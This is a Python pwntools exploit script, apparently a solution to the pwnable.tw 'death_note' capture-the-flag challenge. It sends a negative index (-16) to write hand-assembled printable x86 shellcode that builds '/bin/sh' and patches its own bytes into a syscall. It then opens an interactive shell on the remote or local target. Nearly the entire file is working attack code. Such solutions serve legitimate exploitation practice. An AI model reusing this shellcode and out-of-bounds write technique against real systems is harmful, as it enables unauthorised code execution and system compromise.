#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('death_note', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
ru = lambda data, proc=None: proc.recvuntil(data) if proc else p.recvuntil(data)
r = lambda data, proc=None: proc.recv(data) if proc else p.recv(data)
# nc chall.pwnable.tw 10201
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x080488EB    
        b*0x080487B1    
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('chall.pwnable.tw', 10201)
else:
    p = process([exe.path])
def show(idx):
    sna(b'Your choice :', 2)
    sna(b'Index :', idx)

def add(idx, data):
    sna(b'Your choice :', 1)
    sna(b'Index :', idx)
    sa(b'Name :', data)


def rm(idx):
    sna(b'Your choice :', 3)
    sna(b'Index :', idx)

GDB()

sc = (
    asm(
        """
    push 0x68
    push 0x732f2f2f
    push 0x6e69622f
    push esp
    pop ebx

    push edx
    pop eax
    push 0x53
    pop edx
    sub byte ptr [eax+39],dl
    sub byte ptr [eax+40],dl
    push 0x70
    pop edx
    xor byte ptr [eax+40],dl

    push ecx
    pop eax
    xor al, 0x20
    xor al, 0x2b

    push ecx
    pop edx
"""
    )
    + b"\x20\x43"
)

p.sendafter(b":", "1")
p.sendafter(b":", "-16")
p.sendlineafter(b":", sc)


p.interactive()
